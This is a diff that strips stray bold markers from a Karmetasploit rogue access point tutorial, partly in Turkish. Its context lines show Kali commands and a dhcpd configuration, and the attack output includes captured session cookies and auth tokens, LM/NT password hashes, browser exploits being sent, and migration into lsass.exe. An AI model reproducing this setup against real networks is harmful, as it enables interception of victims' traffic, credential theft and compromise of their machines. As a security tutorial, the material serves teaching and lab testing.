@@ -43,11 +43,11 @@ root@kali:~# wget <a href="https://www.offensive-security.com/wp-content/uploads
 Resolving <a href="http://www.offensive-security.com/">www.offensive-security.com</a> (<a href="http://www.offensive-security.com/">www.offensive-security.com</a>)... 198.50.176.211
 Connecting to <a href="http://www.offensive-security.com/">www.offensive-security.com</a> (<a href="http://www.offensive-security.com/">www.offensive-security.com</a>)|198.50.176.211|:443... connected.
 HTTP request sent, awaiting response... 200 OK
-Length: 1089 (1.1K) **[**text/plain]
+Length: 1089 (1.1K) [text/plain]
 
 Saving to: `karma.rc' 100%[======================================>] 1,089 --.-K/s in 0s
 
-2015-04-03 16:17:28 (35.9 MB/s) - `karma.rc' saved **[**1089/1089]
+2015-04-03 16:17:28 (35.9 MB/s) - `karma.rc' saved [1089/1089]
 root@kali:~#
 ```
 
@@ -89,11 +89,11 @@ authoritative;
 
 log-facility local7;
 
-subnet 10.0.0.0 netmask 255.255.255.0 **{**
+subnet 10.0.0.0 netmask 255.255.255.0 {
   range 10.0.0.100 10.0.0.254;
   option routers 10.0.0.1;
   option domain-name-servers 10.0.0.1;
-**}**
+}
 root@kali:~#
 ```
 
@@ -174,8 +174,8 @@ PHY	Interface	Driver		Chipset
 
 phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 
-		(mac80211 monitor mode vif enabled for** **[**phy0]wlan0 on **[**phy0]wlan0mon)
-		(mac80211 station mode vif disabled for** **[**phy0]wlan0)
+		(mac80211 monitor mode vif enabled for** [phy0]wlan0 on [phy0]wlan0mon)
+		(mac80211 station mode vif disabled for** [phy0]wlan0)
 
 Found 2 processes that could cause trouble.
 If airodump-ng, aireplay-ng or airtun-ng stops working after
@@ -230,7 +230,7 @@ Listening on LPF/at0/00:c0:ca:82:d9:63/10.0.0.0/24
 Sending on   LPF/at0/00:c0:ca:82:d9:63/10.0.0.0/24
 Sending on   Socket/fallback/fallback-net
 
-root@kali:~# ps aux | grep **[**d]hcpd
+root@kali:~# ps aux | grep [d]hcpd
 root      2373  0.0  0.4  28448  9532 ?        Ss   13:45   0:00 dhcpd -cf /etc/dhcp/dhcpd.conf at0
 root@kali:~#
 ```
@@ -300,7 +300,7 @@ Kayıt edilen paketlere bakalım.
 msf auxiliary(http) >
 > DNS 10.0.0.100:1276 XID 87 (IN::A <a href="http://www.msn.com/">www.msn.com</a>)
 > DNS 10.0.0.100:1276 XID 87 (IN::A <a href="http://www.msn.com/">www.msn.com</a>)
-> HTTP REQUEST 10.0.0.100 > <a href="http://www.msn.com/">www.msn.com:80</a> GET / Windows IE 5.01 cookies**=**MC1**=**V**=**3&amp;GUID**=**e2eabc69be554e3587acce84901a53d3; MUID**=**E7E065776DBC40099851B16A38DB8275; mh**=**MSFT; CULTURE**=**EN-US; zip**=**z:68101|la:41.26|lo:-96.013|c:US|hr:1; FlightGroupId**=**14; FlightId**=**BasePage; hpsvr**=**M:5|F:5|T:5|E:5|D:blu|W:F; hpcli**=**W.H|L.|S.|R.|U.L|C.|H.; ushpwea**=**wc:USNE0363; wpv**=**2
+> HTTP REQUEST 10.0.0.100 > <a href="http://www.msn.com/">www.msn.com:80</a> GET / Windows IE 5.01 cookies=MC1=V=3&amp;GUID=e2eabc69be554e3587acce84901a53d3; MUID=E7E065776DBC40099851B16A38DB8275; mh=MSFT; CULTURE=EN-US; zip=z:68101|la:41.26|lo:-96.013|c:US|hr:1; FlightGroupId=14; FlightId=BasePage; hpsvr=M:5|F:5|T:5|E:5|D:blu|W:F; hpcli=W.H|L.|S.|R.|U.L|C.|H.; ushpwea=wc:USNE0363; wpv=2
 > DNS 10.0.0.100:1279 XID 88 (IN::A <a href="http://adwords.google.com/">adwords.google.com</a>)
 > DNS 10.0.0.100:1279 XID 88 (IN::A <a href="http://adwords.google.com/">adwords.google.com</a>)
 > DNS 10.0.0.100:1280 XID 89 (IN::A <a href="http://blogger.com/">blogger.com</a>)
@@ -420,9 +420,9 @@ Bu kısımda, kullanıcının bağlanmak istediği adreslere dair DNS Lookup iş
 
 ```bash
 > HTTP REQUEST 10.0.0.100 > <a href="http://gmail.google.com/">gmail.google.com</a>:80 GET /forms.html Windows IE 5.01 cook
-ies**=**PREF**=**ID**=**474686c582f13be6:U**=**ecaec12d78faa1ba:TM**=**1241334857:LM**=**1241334880: S**=**snePRUjY-zgcXpEV;NID**=**22**=**nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6h I1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+ies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6h I1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
 
-> HTTP REQUEST 10.0.0.100 > <a href="http://google.com/">google.com</a>:80 GET /forms.html Windows IE 5.01 cookies**=**PREF**=**ID**=**474686c582f13be6:U**=**ecaec12d78faa1ba:TM**=**1241334857:LM**=**1241334880: S**=**snePRUjY-zgcXpEV;NID**=**22**=**nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4e FCH6hI1ae23g hwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
+> HTTP REQUEST 10.0.0.100 > <a href="http://google.com/">google.com</a>:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4e FCH6hI1ae23g hwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
 Here we can see Karmetasploit collecting cookie information from the client. This could be useful information to use **in **attacks against the user later on.
 
 > Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0
@@ -451,10 +451,10 @@ Here we can see Karmetasploit collecting cookie information from the client. Thi
 > Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
 > Sending stage (2650 bytes)
 > Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
-> HTTP REQUEST 10.0.0.100 > <a href="http://www.care2.com/">www.care2.com:80</a> GET / Windows IE 5.01 cookies**=**
+> HTTP REQUEST 10.0.0.100 > <a href="http://www.care2.com/">www.care2.com:80</a> GET / Windows IE 5.01 cookies=
 > Sleeping before handling stage...
-> HTTP REQUEST 10.0.0.100 > <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET / Windows IE 5.01 cookies**=**
-> HTTP REQUEST 10.0.0.100 > <a href="http://yahoo.com/">yahoo.com</a>:80 GET / Windows IE 5.01 cookies**=**
+> HTTP REQUEST 10.0.0.100 > <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET / Windows IE 5.01 cookies=
+> HTTP REQUEST 10.0.0.100 > <a href="http://yahoo.com/">yahoo.com</a>:80 GET / Windows IE 5.01 cookies=
 > Uploading DLL (75787 bytes)...
 > Upload completed.
 > Migrating to lsass.exe...
@@ -639,30 +639,30 @@ Veri tabanı şemasından faydalanarak bilgileri kontrol edelim.
 ```bash
 sqlite> **select** ***** from hosts;
 1|2009-05-09 23:47:04|10.0.0.100|||alive||Windows|2000|||x86
-sqlite> **select** ***** from notes where host_id **=** 1;
-1|2009-05-09 23:47:04|1|http_cookies|en-us.start2.mozilla.com __utma**=**183859642.1221819733.1241334886.1241334886.1241334886.1; __utmz**=**183859642.1241334886.1.1.utmccn**=(**organic)|utmcsr**=**google|utmctr**=**firefox|utmcmd**=**organic
+sqlite> **select** ***** from notes where host_id = 1;
+1|2009-05-09 23:47:04|1|http_cookies|en-us.start2.mozilla.com __utma=183859642.1221819733.1241334886.1241334886.1241334886.1; __utmz=183859642.1241334886.1.1.utmccn**=(**organic)|utmcsr=google|utmctr=firefox|utmcmd=organic
 2|2009-05-09 23:47:04|1|http_request|en-us.start2.mozilla.com:80 GET /firefox Windows FF 1.9.0.10
-3|2009-05-09 23:47:05|1|http_cookies|adwords.google.com PREF**=**ID**=**ee60297d21c2a6e5:U**=**ecaec12d78faa1ba:TM**=**1241913986:LM**=**1241926890:GM**=**1:S**=**-p5nGxSz_oh1inss; NID**=**22**=**Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID**=**DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
+3|2009-05-09 23:47:05|1|http_cookies|adwords.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
 4|2009-05-09 23:47:05|1|http_request|adwords.google.com:80 GET /forms.html Windows FF 1.9.0.10
 5|2009-05-09 23:47:05|1|http_request|blogger.com:80 GET /forms.html Windows FF 1.9.0.10
 6|2009-05-09 23:47:05|1|http_request|care.com:80 GET /forms.html Windows FF 1.9.0.10
 7|2009-05-09 23:47:05|1|http_request|0.0.0.0:55550 GET /ads Windows Firefox 3.0.10
 8|2009-05-09 23:47:06|1|http_request|careerbuilder.com:80 GET /forms.html Windows FF 1.9.0.10
 9|2009-05-09 23:47:06|1|http_request|ecademy.com:80 GET /forms.html Windows FF 1.9.0.10
-10|2009-05-09 23:47:06|1|http_cookies|facebook.com datr**=**1241925583-120e39e88339c0edfd73fab6428ed813209603d31bd9d1dccccf3; ABT**=**::#b0ad8a8df29cc7bafdf91e67c86d58561st0:1242530384:A#2dd086ca2a46e9e50fff44e0ec48cb811st0:1242530384:B; s_vsn_facebookpoc_1**=**7269814957402
+10|2009-05-09 23:47:06|1|http_cookies|facebook.com datr=1241925583-120e39e88339c0edfd73fab6428ed813209603d31bd9d1dccccf3; ABT=::#b0ad8a8df29cc7bafdf91e67c86d58561st0:1242530384:A#2dd086ca2a46e9e50fff44e0ec48cb811st0:1242530384:B; s_vsn_facebookpoc_1=7269814957402
 11|2009-05-09 23:47:06|1|http_request|facebook.com:80 GET /forms.html Windows FF 1.9.0.10
 12|2009-05-09 23:47:06|1|http_request|gather.com:80 GET /forms.html Windows FF 1.9.0.10
 13|2009-05-09 23:47:06|1|http_request|gmail.com:80 GET /forms.html Windows FF 1.9.0.10
-14|2009-05-09 23:47:06|1|http_cookies|gmail.google.com PREF**=**ID**=**ee60297d21c2a6e5:U**=**ecaec12d78faa1ba:TM**=**1241913986:LM**=**1241926890:GM**=**1:S**=**-p5nGxSz_oh1inss; NID**=**22**=**Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID**=**DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
+14|2009-05-09 23:47:06|1|http_cookies|gmail.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
 15|2009-05-09 23:47:07|1|http_request|gmail.google.com:80 GET /forms.html Windows FF 1.9.0.10
-16|2009-05-09 23:47:07|1|http_cookies|google.com PREF**=**ID**=**ee60297d21c2a6e5:U**=**ecaec12d78faa1ba:TM**=**1241913986:LM**=**1241926890:GM**=**1:S**=**-p5nGxSz_oh1inss; NID**=**22**=**Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID**=**DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
+16|2009-05-09 23:47:07|1|http_cookies|google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
 17|2009-05-09 23:47:07|1|http_request|google.com:80 GET /forms.html Windows FF 1.9.0.10
 18|2009-05-09 23:47:07|1|http_request|linkedin.com:80 GET /forms.html Windows FF 1.9.0.10
 
-101|2009-05-09 23:50:03|1|http_cookies|safebrowsing.clients.google.com PREF**=**ID**=**ee60297d21c2a6e5:U**=**ecaec12d78faa1ba:TM**=**1241913986:LM**=**1241926890:GM**=**1:S**=**-p5nGxSz_oh1inss; NID**=**22**=**Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID**=**DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
+101|2009-05-09 23:50:03|1|http_cookies|safebrowsing.clients.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
 102|2009-05-09 23:50:03|1|http_request|safebrowsing.clients.google.com:80 POST /safebrowsing/downloads Windows FF 1.9.0.10
-108|2009-05-10 00:43:29|1|http_cookies|twitter.com auth_token**=**1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
-109|2009-05-10 00:43:29|1|http_cookies|www.twitter.com auth_token**=**1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
+108|2009-05-10 00:43:29|1|http_cookies|twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
+109|2009-05-10 00:43:29|1|http_cookies|www.twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
 sqlite>
 ```
 
